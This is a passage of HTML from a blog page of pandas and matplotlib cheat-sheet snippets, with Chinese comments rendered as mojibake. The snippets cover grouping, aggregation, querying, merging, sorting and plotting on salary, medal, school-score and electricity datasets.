åœ¨åŸæ•°æ®æ¡† df æ–°å¢ä¸€åˆ—ï¼Œæ•°å€¼ä¸ºè¯¥åŒºçš„å¹³å‡è–ªèµ„æ°´å¹³</span></span><br><span class="line">df[<span class="string">&#x27;è¯¥åŒºå¹³å‡å·¥èµ„&#x27;</span>] = df[[<span class="string">&#x27;district&#x27;</span>,<span class="string">&#x27;salary&#x27;</span>]].groupby(by=<span class="string">&#x27;district&#x27;</span>).transform(<span class="string">&#x27;mean&#x27;</span>)</span><br><span class="line"><span class="comment"># é€šè¿‡åŒ¿åå‡½æ•°åˆ†ç»„ æ ¹æ® createTime åˆ—ï¼Œè®¡ç®—æ¯å¤©ä¸åŒ è¡Œæ”¿åŒº æ–°å¢çš„å²—ä½æ•°é‡</span></span><br><span class="line">pd.DataFrame(df.groupby([df.createTime.apply(<span class="keyword">lambda</span> x:x.day)])[</span><br><span class="line">             <span class="string">&#x27;district&#x27;</span>].value_counts()).rename_axis([<span class="string">&quot;å‘å¸ƒæ—¥&quot;</span>, <span class="string">&quot;è¡Œæ”¿åŒº&quot;</span>])</span><br><span class="line"><span class="comment"># è®¡ç®—å„è¡Œæ”¿åŒºçš„ä¼ä¸šé¢†åŸŸï¼ˆindustryFieldï¼‰åŒ…å«ç”µå•†çš„æ€»æ•°</span></span><br><span class="line">df.groupby(<span class="string">&#x27;district&#x27;</span>)[<span class="string">&quot;industryField&quot;</span>].apply(<span class="keyword">lambda</span> x: x.<span class="built_in">str</span>.contains(<span class="string">&#x27;ç”µå•†&#x27;</span>).<span class="built_in">sum</span>())</span><br><span class="line"><span class="comment"># è®¡ç®—å„è¡Œæ”¿åŒºçš„ä¼ä¸šé¢†åŸŸï¼ˆindustryFieldï¼‰åŒ…å«ç”µå•†çš„æ€»æ•°</span></span><br><span class="line">df.groupby(<span class="string">&quot;district&quot;</span>, sort=<span class="literal">False</span>)[<span class="string">&quot;industryField&quot;</span>].apply(</span><br><span class="line"><span class="keyword">lambda</span> x: x.<span class="built_in">str</span>.contains(<span class="string">&quot;ç”µå•†&quot;</span>).<span class="built_in">sum</span>())</span><br><span class="line"><span class="comment">#é€šè¿‡ positionName çš„é•¿åº¦è¿›è¡Œåˆ†ç»„ï¼Œå¹¶è®¡ç®—ä¸åŒé•¿åº¦å²—ä½åç§°çš„è–ªèµ„å‡å€¼</span></span><br><span class="line">df.set_index(<span class="string">&quot;positionName&quot;</span>).groupby(<span class="built_in">len</span>)[<span class="string">&#x27;salary&#x27;</span>].mean()</span><br><span class="line">df.groupby(df.positionName.apply(<span class="keyword">lambda</span> x:<span class="built_in">len</span>(x)))[<span class="string">&#x27;salary&#x27;</span>].mean()</span><br><span class="line"><span class="comment"># groupby ç›´æ¥æ”¹å</span></span><br><span class="line">df.groupby(&#123;<span class="string">&#x27;salary&#x27;</span>:<span class="string">&#x27;è–ªèµ„&#x27;</span>,<span class="string">&#x27;score&#x27;</span>:<span class="string">&#x27;æ€»åˆ†&#x27;</span>,<span class="string">&#x27;matchScore&#x27;</span>:<span class="string">&#x27;æ€»åˆ†&#x27;</span>&#125;, axis=<span class="number">1</span>).<span class="built_in">sum</span>()</span><br><span class="line"><span class="comment"># groupby ç”¨å­—å…¸</span></span><br><span class="line"><span class="comment">#å°† score å’Œ matchScore çš„å’Œè®°ä¸ºæ€»åˆ†ï¼Œä¸ salary åˆ—åŒæ—¶è¿›è¡Œåˆ†ç»„ï¼Œå¹¶æŸ¥çœ‹ç»“æœ</span></span><br><span class="line">df.groupby(&#123;<span class="string">&#x27;salary&#x27;</span>:<span class="string">&#x27;è–ªèµ„&#x27;</span>,<span class="string">&#x27;score&#x27;</span>:<span class="string">&#x27;æ€»åˆ†&#x27;</span>,<span class="string">&#x27;matchScore&#x27;</span>:<span class="string">&#x27;æ€»åˆ†&#x27;</span>&#125;, axis=<span class="number">1</span>).<span class="built_in">sum</span>()</span><br><span class="line"><span class="comment"># èšåˆ</span></span><br><span class="line">df[<span class="string">&#x27;salary&#x27;</span>].groupby(df[<span class="string">&#x27;district&#x27;</span>]).mean() </span><br><span class="line"><span class="comment"># ç­‰ä»·</span></span><br><span class="line">df[[<span class="string">&#x27;district&#x27;</span>,<span class="string">&#x27;salary&#x27;</span>]].groupby(<span class="string">&#x27;district&#x27;</span>).mean()</span><br><span class="line"><span class="comment"># åœ¨åŸæ•°æ®æ¡† df æ–°å¢ä¸€åˆ—ï¼Œæ•°å€¼ä¸ºè¯¥åŒºçš„å¹³å‡è–ªèµ„æ°´å¹³</span></span><br><span class="line">df[<span class="string">&#x27;è¯¥åŒºå¹³å‡å·¥èµ„&#x27;</span>] = df[[<span class="string">&#x27;district&#x27;</span>,<span class="string">&#x27;salary&#x27;</span>]].groupby(by=<span class="string">&#x27;district&#x27;</span>).transform(<span class="string">&#x27;mean&#x27;</span>)</span><br><span class="line"><span class="comment"># æå–å¹³å‡å·¥èµ„å°äº 30000 çš„è¡Œæ”¿åŒºçš„å…¨éƒ¨æ•°æ®</span></span><br><span class="line">df.groupby(<span class="string">&#x27;district&#x27;</span>).<span class="built_in">filter</span>(<span class="keyword">lambda</span> x: x[<span class="string">&#x27;salary&#x27;</span>].mean() &lt; <span class="number">30000</span>)</span><br><span class="line"><span class="comment"># åˆ†ç»„è®¡ç®—ä¸åŒè¡Œæ”¿åŒºï¼Œè–ªæ°´çš„æœ€å°å€¼ã€æœ€å¤§å€¼å’Œå¹³å‡å€¼</span></span><br><span class="line">df.groupby(<span class="string">&#x27;district&#x27;</span>)[<span class="string">&#x27;salary&#x27;</span>].agg([<span class="built_in">min</span>, <span class="built_in">max</span>, np.mean])</span><br><span class="line"><span class="comment"># å¯¹ä¸åŒè¡Œæ”¿åŒºè¿›è¡Œåˆ†ç»„ï¼Œå¹¶ç»Ÿè®¡è–ªæ°´çš„å‡å€¼ã€ä¸­ä½æ•°ã€æ–¹å·®ï¼Œä»¥åŠå¾—åˆ†çš„å‡å€¼</span></span><br><span class="line">df.groupby(<span class="string">&#x27;district&#x27;</span>).agg(</span><br><span class="line">    &#123;<span class="string">&#x27;salary&#x27;</span>: [np.mean, np.median, np.std], <span class="string">&#x27;score&#x27;</span>: np.mean&#125;)</span><br><span class="line"><span class="comment"># é€šè¿‡ df2 è®¡ç®—è·å¾—å¥–ç‰Œæœ€å¤šçš„è¿åŠ¨å‘˜</span></span><br><span class="line">df2[<span class="string">&#x27;è¿åŠ¨å‘˜&#x27;</span>].value_counts().sort_values(ascending=<span class="literal">False</span>).head(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># æŸ¥çœ‹å„å›½åœ¨ä¸åŒé¡¹ç›®ä¸Šçš„è·å¥–ç‰Œæƒ…å†µ</span></span><br><span class="line">df2[<span class="string">&#x27;æ€»å¥–ç‰Œæ•°&#x27;</span>].groupby([df2[<span class="string">&#x27;å›½å®¶&#x27;</span>],df2[<span class="string">&#x27;è¿åŠ¨ç±»åˆ«&#x27;</span>]]).count().to_frame()</span><br><span class="line">df2.groupby([<span class="string">&#x27;å›½å®¶&#x27;</span>,<span class="string">&#x27;è¿åŠ¨ç±»åˆ«&#x27;</span>]).count()[<span class="string">&#x27;æ€»å¥–ç‰Œæ•°&#x27;</span>].to_frame()</span><br><span class="line">pd.pivot_table(df2,values = [<span class="string">&#x27;å¥–ç‰Œç±»å‹&#x27;</span>],index = [<span class="string">&#x27;å›½å®¶&#x27;</span>,<span class="string">&#x27;è¿åŠ¨ç±»åˆ«&#x27;</span>],aggfunc = <span class="string">&#x27;count&#x27;</span>)</span><br><span class="line"><span class="comment"># æŒ‰ç…§è¡Œè®¡ç®—å¹³å‡å€¼</span></span><br><span class="line">df.mean(axis=<span class="string">&#x27;columns&#x27;</span>)</span><br><span class="line">df.mean(axis=<span class="number">1</span>) <span class="comment">#ä¸æ˜¯0ï¼Œ1æ˜¯ç®—æ¯åˆ—çš„å‡å€¼ç„¶åç„¶ååˆå¹¶ä¸ºä¸€è¡Œ</span></span><br><span class="line"><span class="comment"># æå–å¹³å‡å·¥èµ„å°äº 30000 çš„è¡Œæ”¿åŒºçš„å…¨éƒ¨æ•°æ®</span></span><br><span class="line">df.groupby(<span class="string">&#x27;district&#x27;</span>).<span class="built_in">filter</span>(<span class="keyword">lambda</span> x: x[<span class="string">&#x27;salary&#x27;</span>].mean() &lt; <span class="number">30000</span>)</span><br><span class="line"><span class="comment"># èšåˆç»Ÿè®¡</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">df.groupby(<span class="string">&#x27;district&#x27;</span>)[<span class="string">&#x27;salary&#x27;</span>].agg([<span class="built_in">min</span>, <span class="built_in">max</span>, np.mean])</span><br><span class="line"><span class="comment">#æŸ¥çœ‹ç¼ºå¤±å€¼æ¯”ä¾‹ï¼Œå¹¶æ’åº  ä¸æ˜¯countï¼ï¼ï¼</span></span><br><span class="line">data = df.isna().<span class="built_in">sum</span>()/df.shape[<span class="number">0</span>]</span><br><span class="line">data.sort_values().<span class="built_in">map</span>(<span class="keyword">lambda</span> x:<span class="string">&quot;&#123;:.2%&#125;&quot;</span>.<span class="built_in">format</span>(x))</span><br><span class="line"><span class="comment">#å¯¹ä¸åŒå²—ä½(positionName)è¿›è¡Œåˆ†ç»„ï¼Œå¹¶ç»Ÿè®¡å…¶è–ªæ°´(salary)ä¸­ä½æ•°å’Œå¾—åˆ†(score)å‡å€¼</span></span><br><span class="line">df.groupby(<span class="string">&#x27;positionName&#x27;</span>).agg(&#123;<span class="string">&#x27;salary&#x27;</span>: np.median, <span class="string">&#x27;score&#x27;</span>: np.mean&#125;)</span><br><span class="line"><span class="comment"># è‡ªå®šä¹‰å‡½æ•°</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">myfunc</span>(<span class="params">x</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> x.<span class="built_in">max</span>()-x.mean()</span><br><span class="line"></span><br><span class="line">df.groupby(<span class="string">&#x27;district&#x27;</span>).agg(æœ€ä½å·¥èµ„=(<span class="string">&#x27;salary&#x27;</span>, <span class="string">&#x27;min&#x27;</span>), æœ€é«˜å·¥èµ„=(</span><br><span class="line">    <span class="string">&#x27;salary&#x27;</span>, <span class="string">&#x27;max&#x27;</span>), å¹³å‡å·¥èµ„=(<span class="string">&#x27;salary&#x27;</span>, <span class="string">&#x27;mean&#x27;</span>), æœ€å¤§å€¼ä¸å‡å€¼å·®å€¼=(<span class="string">&#x27;salary&#x27;</span>, myfunc)).rename_axis([<span class="string">&quot;è¡Œæ”¿åŒº&quot;</span>])</span><br></pre></td></tr></table></figure><h3><span id="æ•°æ®æŸ¥è¯¢">æ•°æ®æŸ¥è¯¢</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æŸ¥è¯¢æŸåˆ—çš„å€¼ä¸ºxæ—¶ï¼Œå³ä½¿è¯¥åˆ—ä¸ºåæ ‡</span></span><br><span class="line"><span class="comment">#æŸ¥è¯¢ä¸­å›½é˜Ÿçš„è·å¥–ç‰Œ</span></span><br><span class="line">df3.query(<span class="string">&quot;å›½å®¶ == [&#x27;ä¸­å›½&#x27;]&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#è®¡ç®—ä¸­å›½æ¯æ—¥æ€»å¥–ç‰Œæ•°é‡ ç´¯è®¡</span></span><br><span class="line">df2.groupby([<span class="string">&#x27;è·å¥–æ—¶é—´&#x27;</span>,<span class="string">&#x27;å›½å®¶&#x27;</span>]).count()[<span class="string">&#x27;å¥–ç‰Œç±»å‹&#x27;</span>].to_frame().query(<span class="string">&#x27;å›½å®¶==[&quot;ä¸­å›½&quot;]&#x27;</span>).cumsum()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#æŸ¥è¯¢ç©ºå€¼æ‰€åœ¨è¡Œ</span></span><br><span class="line">df[df.isnull().T.<span class="built_in">any</span>() == <span class="literal">True</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹é‡å¤çš„</span></span><br><span class="line">df[df.duplicated()]</span><br><span class="line"></span><br><span class="line"><span class="comment">#æŸ¥è¯¢æ¡ä»¶</span></span><br><span class="line">df_01.loc[df_01[<span class="string">&#x27;è¡Œä¸šï¼ˆæŒ‰è¡Œä¸šå¤§ç±»ï¼‰&#x27;</span>].isin([<span class="string">&#x27;å·¥ä¸š&#x27;</span>,<span class="string">&#x27;å»ºç­‘ä¸š&#x27;</span>])]</span><br><span class="line">df_01.loc[(df_01[<span class="string">&#x27;è¡Œä¸šï¼ˆæŒ‰è¡Œä¸šå¤§ç±»ï¼‰&#x27;</span>]==<span class="string">&#x27;å·¥ä¸š&#x27;</span>)|(df_01[<span class="string">&#x27;è¡Œä¸šï¼ˆæŒ‰è¡Œä¸šå¤§ç±»ï¼‰&#x27;</span>]==<span class="string">&#x27;å»ºç­‘ä¸š&#x27;</span>)]</span><br><span class="line">df_01[df_01[<span class="string">&#x27;è¡Œä¸šï¼ˆæŒ‰è¡Œä¸šå¤§ç±»ï¼‰&#x27;</span>].<span class="built_in">str</span>.contains(<span class="string">&#x27;å·¥ä¸š|å»ºç­‘ä¸š&#x27;</span>)]</span><br></pre></td></tr></table></figure><h3><span id="æ•°æ®æ±‡æ€»">æ•°æ®æ±‡æ€»</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è®¡ç®— æ€»åˆ†ã€é«˜ç«¯äººæ‰å¾—åˆ†ã€åŠå­¦å±‚æ¬¡å¾—åˆ†çš„æœ€å¤§æœ€å°å€¼ã€ä¸­ä½æ•°ã€å‡å€¼</span></span><br><span class="line">df.agg(&#123;</span><br><span class="line">        <span class="string">&quot;æ€»åˆ†&quot;</span>: [<span class="string">&quot;min&quot;</span>, <span class="string">&quot;max&quot;</span>, <span class="string">&quot;median&quot;</span>, <span class="string">&quot;mean&quot;</span>],</span><br><span class="line">        <span class="string">&quot;é«˜ç«¯äººæ‰å¾—åˆ†&quot;</span>: [<span class="string">&quot;min&quot;</span>, <span class="string">&quot;max&quot;</span>, <span class="string">&quot;median&quot;</span>, <span class="string">&quot;mean&quot;</span>],</span><br><span class="line">        <span class="string">&quot;åŠå­¦å±‚æ¬¡å¾—åˆ†&quot;</span>:[<span class="string">&quot;min&quot;</span>, <span class="string">&quot;max&quot;</span>, <span class="string">&quot;median&quot;</span>, <span class="string">&quot;mean&quot;</span>]&#125;)</span><br></pre></td></tr></table></figure><h3><span id="æ•°æ®åˆå¹¶">æ•°æ®åˆå¹¶</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å‚ç›´æ‹¼æ¥ df1ã€df2ã€df3ï¼Œæ•ˆæœå¦‚ä¸‹å›¾æ‰€ç¤º</span></span><br><span class="line">pd.concat([df1, df2, df3])</span><br><span class="line"><span class="comment"># å‚ç›´æ‹¼æ¥ df1 å’Œ df4ï¼Œå¹¶æŒ‰é¡ºåºé‡æ–°ç”Ÿæˆç´¢å¼•ï¼Œ</span></span><br><span class="line">df = pd.concat([df1,df4]).reset_index()</span><br><span class="line"><span class="comment"># æˆ–è€…</span></span><br><span class="line">df = pd.concat([df1, df4], ignore_index=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ¨ªå‘æ‹¼æ¥</span></span><br><span class="line">pd.concat([df1,df4],axis=<span class="number">1</span>)</span><br><span class="line"><span class="comment"># åœ¨ä¸Šä¸€é¢˜çš„åŸºç¡€ä¸Šï¼Œåªå–ç»“æœçš„äº¤é›†</span></span><br><span class="line">pd.concat([df1,df4],axis=<span class="number">1</span>,join=<span class="string">&#x27;inner&#x27;</span>)</span><br><span class="line"><span class="comment"># åªå–åŒ…å« df1 ç´¢å¼•çš„éƒ¨åˆ†</span></span><br><span class="line">pd.concat([df1, df4], axis=<span class="number">1</span>).reindex(df1.index)</span><br><span class="line"><span class="comment"># æ‹¼æ¥ df1ã€df2ã€df3ï¼ŒåŒæ—¶æ–°å¢ä¸€ä¸ªç´¢å¼•ï¼ˆxã€yã€zï¼‰æ¥åŒºåˆ†ä¸åŒçš„è¡¨æ•°æ®æ¥æº</span></span><br><span class="line">pd.concat([df1, df2, df3], keys=[<span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>])</span><br><span class="line"><span class="comment"># æ ¹æ® key è¿æ¥ left å’Œ right</span></span><br><span class="line">pd.merge(left, right, on=<span class="string">&#x27;key&#x27;</span>)</span><br><span class="line"><span class="comment"># æ ¹æ® key1 å’Œ key2 è¿æ¥ left å’Œ right</span></span><br><span class="line">pd.merge(left, right, on=[<span class="string">&#x27;key1&#x27;</span>, <span class="string">&#x27;key2&#x27;</span>])</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">how å¯ä»¥è®¾ç½®</span></span><br><span class="line"><span class="string">rightã€left: å·¦å¤–ï¼Œå³å¤–</span></span><br><span class="line"><span class="string">outerã€inner: å…¨å¤–è¿æ¥ï¼Œå†…è¿æ¥</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">pd.merge(left, right, how=<span class="string">&#x27;left&#x27;</span>, on=[<span class="string">&#x27;key1&#x27;</span>, <span class="string">&#x27;key2&#x27;</span>])</span><br><span class="line"><span class="comment"># é‡æ–°äº§ç”Ÿæ•°æ®</span></span><br><span class="line">left.join(right, on=[<span class="string">&#x27;key1&#x27;</span>, <span class="string">&#x27;key2&#x27;</span>])</span><br></pre></td></tr></table></figure><h3><span id="å¤šä¸ªdfç”»ä¸€èµ·">å¤šä¸ªDFç”»ä¸€èµ·</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">fig, ax = plt.subplots(figsize=(<span class="number">16</span>,<span class="number">10</span>))   </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">to_percent</span>(<span class="params">temp, position</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;%1.0f&#x27;</span>%(<span class="number">100</span>*temp) + <span class="string">&#x27;%&#x27;</span></span><br><span class="line">plt.gca().yaxis.set_major_formatter(FuncFormatter(to_percent))</span><br><span class="line">ax.plot(max_data,label=<span class="string">&#x27;first one&#x27;</span>)</span><br><span class="line">ax.plot(min_data,label=<span class="string">&#x27;last one&#x27;</span>)</span><br><span class="line">ax.plot(q3_df,label=<span class="string">&#x27;mean&#x27;</span>)</span><br><span class="line">ax.set_title(<span class="string">&#x27;Daily Empty Rate Comparison For Village Y&#x27;</span>)</span><br><span class="line">plt.legend(loc=<span class="string">&#x27;best&#x27;</span>)</span><br><span class="line">plt.savefig(<span class="string">&#x27;C-4.png&#x27;</span>)</span><br></pre></td></tr></table></figure><h3><span id="åˆ†æå’Œæ’åº">åˆ†æå’Œæ’åº</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å°†ç©ºç½®ç‡ä»ä½åˆ°é«˜æ’åº</span></span><br><span class="line">q1_df=q1_df.sort_values(<span class="string">&#x27;AT_HOME&#x27;</span>)</span><br><span class="line"><span class="comment"># å‚æ•°byå¯ä»¥å¿½ç•¥</span></span><br><span class="line">df.sort_values(by=<span class="string">&#x27;æ€»åˆ†&#x27;</span>, ascending=<span class="literal">True</span>).head(<span class="number">20</span>)</span><br><span class="line"><span class="comment"># æŸ¥çœ‹å„é¡¹å¾—åˆ†æœ€é«˜çš„å­¦æ ¡åç§°</span></span><br><span class="line">df.iloc[:,<span class="number">3</span>:].idxmax()</span><br><span class="line"><span class="comment"># ç»Ÿè®¡ æ€»åˆ† åˆ—çš„å‡å€¼</span></span><br><span class="line">df[<span class="string">&#x27;æ€»åˆ†&#x27;</span>].mean()</span><br><span class="line">df.æ€»åˆ†.mean()</span><br><span class="line"><span class="comment"># è®¡ç®—æ€»åˆ†åˆ—çš„ä¸­ä½æ•°</span></span><br><span class="line">df.æ€»åˆ†.median()</span><br><span class="line"><span class="comment"># è®¡ç®—æ€»åˆ†åˆ—çš„ä¼—æ•°</span></span><br><span class="line">df.æ€»åˆ†.mode()</span><br><span class="line"><span class="comment"># æŸ¥çœ‹æ•°å€¼å‹æ•°æ®çš„ç»Ÿè®¡ä¿¡æ¯ï¼ˆå‡å€¼ã€åˆ†ä½æ•°ç­‰ï¼‰ï¼Œå¹¶ä¿ç•™ä¸¤ä½å°æ•°</span></span><br><span class="line">df.describe().<span class="built_in">round</span>(<span class="number">2</span>).T</span><br></pre></td></tr></table></figure><h3><span id="åŒçºµåæ ‡è½´">åŒçºµåæ ‡è½´</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯¼å…¥data.csv</span></span><br><span class="line">df = pd.read_csv(<span class="string">&#x27;data.csv&#x27;</span>)</span><br><span class="line"><span class="comment"># å°†Dateè½¬ä¸ºæ—¥æœŸæ ¼å¼</span></span><br><span class="line">df[<span class="string">&#x27;Date&#x27;</span>] = pd.to_datetime(df[<span class="string">&#x27;Date&#x27;</span>])</span><br><span class="line"><span class="comment"># ä¼˜åŒ–dfçš„ç»“æ„</span></span><br><span class="line">df=df.reset_index(drop=<span class="literal">True</span>).set_index(<span class="string">&#x27;Date&#x27;</span>)</span><br><span class="line"><span class="comment"># é€‰æ‹©æ•°æ®èŒƒå›´ 2014å¹´1æœˆ1æ—¥è‡³2018å¹´7æœˆ31æ—¥</span></span><br><span class="line">q1_df = df[<span class="string">&#x27;2014-01-01&#x27;</span>:<span class="string">&#x27;2018-07-31&#x27;</span>]</span><br><span class="line"><span class="comment"># æ„å»ºç”»å›¾ä½¿ç”¨çš„dataframe æ¯å¤©çš„æ—¥ç”µé‡ã€æœ€é«˜æ¸©åº¦ã€æœ€ä½æ¸©åº¦</span></span><br><span class="line">q1_plot_df = q1_df[[<span class="string">&#x27;DailyElectricity&#x27;</span>,<span class="string">&#x27;MaxTemperature&#x27;</span>,<span class="string">&#x27;MinTemperature&#x27;</span>]]</span><br><span class="line"><span class="comment"># ç”»å›¾</span></span><br><span class="line">fig,ax = plt.subplots(figsize=(<span class="number">10</span>,<span class="number">8</span>))</span><br><span class="line">ax.plot(df[<span class="string">&#x27;DailyElectricity&#x27;</span>],color=<span class="string">&#x27;r&#x27;</span>,label=<span class="string">&#x27;DailyElectricity&#x27;</span>)</span><br><span class="line"><span class="comment"># é•œåƒxè½´</span></span><br><span class="line">ax2 = ax.twinx()</span><br><span class="line">ax2.plot(df[<span class="string">&#x27;MaxTemperature&#x27;</span>],color=<span class="string">&#x27;b&#x27;</span>,label=<span class="string">&#x27;MaxTemperature&#x27;</span>)</span><br><span class="line">ax2.plot(df[<span class="string">&#x27;MinTemperature&#x27;</span>],color=<span class="string">&#x27;g&#x27;</span>,label=<span class="string">&#x27;MinTemperature&#x27;</span>)</span><br><span class="line"><span class="comment"># æ·»åŠ å›¾ä¾‹</span></span><br><span class="line">ax.legend(loc=<span class="string">&#x27;best&#x27;</span>)</span><br><span class="line">ax2.legend(loc=<span class="string">&#x27;best&#x27;</span>)</span><br><span class="line">ax.set_title(<span class="string">&#x27;Daily Usage and Temperature&#x27;</span>)</span><br><span class="line">plt.savefig(<span class="string">&#x27;F-1.png&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><span id="æ„å»ºç©ºdf">æ„å»ºç©ºDF</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">max_data = pd.DataFrame(columns=&#123;<span class="string">&#x27;DATA_DATE&#x27;</span>,<span class="string">&#x27;empty_ratio&#x27;</span>&#125;)</span><br><span class="line">min_data = pd.DataFrame(columns=&#123;<span class="string">&#x27;DATA_DATE&#x27;</span>,<span class="string">&#x27;empty_ratio&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(q4_df)):</span><br><span class="line">    indx = q4_df.index[i][<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line">    val = q4_df.iloc[i][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> indx == <span class="string">&#x27;Street A&#x27;</span>:</span><br><span class="line">        max_data = max_data.append([&#123;<span class="string">&#x27;DATA_DATE&#x27;</span>:q4_df.index[i][<span class="number">0</span>],<span class="string">&#x27;empty_ratio&#x27;</span>:val&#125;],ignore_index=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> indx == <span class="string">&#x27;Street G&#x27;</span>:</span><br><span class="line">        min_data = min_data.append(&#123;<span class="string">&#x27;DATA_DATE&#x27;</span>:q4_df.index[i][<span class="number">0</span>],<span class="string">&#x27;empty_ratio&#x27;</span>:val&#125;,ignore_index=<span class="literal">True</span>)</span><br><span class="line">        </span><br><span class="line">max_data=max_data.reset_index(drop=<span class="literal">True</span>).set_index(max_data[<span class="string">&#x27;DATA_DATE&#x27;</span>]).drop(<span class="string">&#x27;DATA_DATE&#x27;</span>,<span class="number">1</span>)</span><br><span class="line">min_data=min_data.reset_index(drop=<span class="literal">True</span>).set_index(min_data[<span class="string">&#x27;DATA_DATE&#x27;</span>]).drop(<span class="string">&#x27;DATA_DATE&#x27;</span>,<span class="number">1</span>)</span><br><span class="line"><span class="comment"># æ–°å»ºdf æ–¹æ³•ä¸€</span></span><br><span class="line"></span><br><span class="line">cols_q3=[<span class="string">&#x27;ç±»åˆ«&#x27;</span>,<span class="string">&#x27;æœ¬å‘¨ç”µé‡&#x27;</span>,<span class="string">&#x27;ä¸Šå‘¨å‘¨ç”µé‡&#x27;</span>,<span class="string">&#x27;ç¯æ¯”æå‡&#x27;</span>,<span class="string">&#x27;å†œå†åŒæœŸå‘¨ç”µé‡&#x27;</span>,<span class="string">&#x27;åŒæ¯”æå‡&#x27;</span>]</span><br><span class="line">q3_df = pd.DataFrame(columns=cols_q3)</span><br><span class="line">q3_df.loc[<span 